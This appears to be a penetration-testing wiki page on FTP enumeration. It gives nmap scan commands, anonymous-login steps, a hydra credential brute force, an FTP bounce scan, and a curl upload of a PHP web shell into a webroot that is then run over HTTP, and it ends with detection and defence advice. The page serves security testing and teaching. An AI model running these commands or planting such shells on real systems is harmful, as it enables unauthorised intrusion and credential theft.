---
title: FTP enumeration
slug: ftp-enum
---

> **TL;DR:** TCP/21 still leaks creds, anonymous shares, and writable webroots. Hit banner/version, anonymous login, directory listing, writable paths, and bounce-scan abuse before moving on.

## What it is
File Transfer Protocol exposes a plaintext control channel on TCP/21 and a separate data channel (active 20/TCP from server, or passive on a high port). For attackers it is a banner-leaky, often-misconfigured service that frequently allows anonymous access, exposes web/source roots, and ships with historical RCE bugs (vsftpd 2.3.4 backdoor, ProFTPD mod_copy CVE-2015-3306, Serv-U CVE-2021-35211). Even where login is blocked, the protocol leaks software/version and supports `FTP bounce` (PORT command) and TLS negotiation quirks worth probing.

## Preconditions / where it applies
- TCP/21 reachable; 990 for implicit FTPS; 989 for FTPS data; high passive ports negotiable.
- Anonymous (`anonymous:anonymous` or `ftp:ftp`) sometimes enabled — especially on appliances, embedded NAS, vendor support drops.
- Webroot served from the same path as an FTP user → writable FTP + HTTP execution = pre-auth RCE.
- Related: [[http-enum]], [[smb-enum]], [[exposed-services]], [[known-cve-triage]].

## Technique
Grab banner and feature set first:

```bash
nmap -sV -p21,990 -Pn --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-proftpd-backdoor TARGET
```

Manual interaction reveals more than scripts. `FEAT` enumerates `MLSD`, `AUTH TLS`, `REST STREAM`, `SIZE`:

```text
$ ftp -n TARGET
ftp> quote USER anonymous
ftp> quote PASS anonymous@
ftp> quote FEAT
ftp> quote SYST
ftp> ls -la
ftp> binary
ftp> passive
```

Writable-directory check — upload a tiny file, then look for it via HTTP if a webroot overlaps:

```bash
curl -T shell.php "ftp://anonymous:anonymous@TARGET/htdocs/shell.php"
curl "http://TARGET/shell.php?cmd=id"
```

Credential brute is noisy but cheap when lockout is absent:

```bash
hydra -L users.txt -P passwords.txt -f -e nsr ftp://TARGET
```

FTP bounce (`PORT a,b,c,d,p1,p2`) turns the server into a scan proxy against hosts it can reach but you cannot — still occasionally useful for traversing one-way firewalls:

```bash
nmap -Pn -p- -b anonymous:anonymous@TARGET INTERNAL_HOST
```

For FTPS, check `AUTH TLS` upgrade and `PROT P` for encrypted data — older stacks accept weak ciphers and skip cert validation, enabling MITM of creds.

## Detection and defence
- Failed-login storms and rapid `PORT` commands surface in FTP server logs (`vsftpd.log`, IIS FTP logs) and Zeek `ftp.log`.
- Disable anonymous, enforce FTPS (or kill FTP entirely in favour of SFTP/SSH), patch to current vendor builds, jail accounts with `chroot` and non-overlapping webroots.
- Block FTP bounce by rejecting `PORT` commands whose IP differs from the control-channel client (`port_promiscuous=NO` in vsftpd).
- Network ACLs should drop inbound 21/TCP from untrusted segments; egress filter to stop reverse-FTP exfiltration.

## References
- [HackTricks — 21 FTP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ftp/index.html) — exhaustive checklist of FTP attacks and scripts.
- [Nmap NSE FTP scripts](https://nmap.org/nsedoc/categories/default.html) — `ftp-anon`, `ftp-bounce`, version-specific backdoor checks.
- [OWASP WSTG — Information Gathering](https://owasp.org/www-project-web-security-testing-guide/stable/) — guidance on enumerating ancillary services exposed by web stacks.
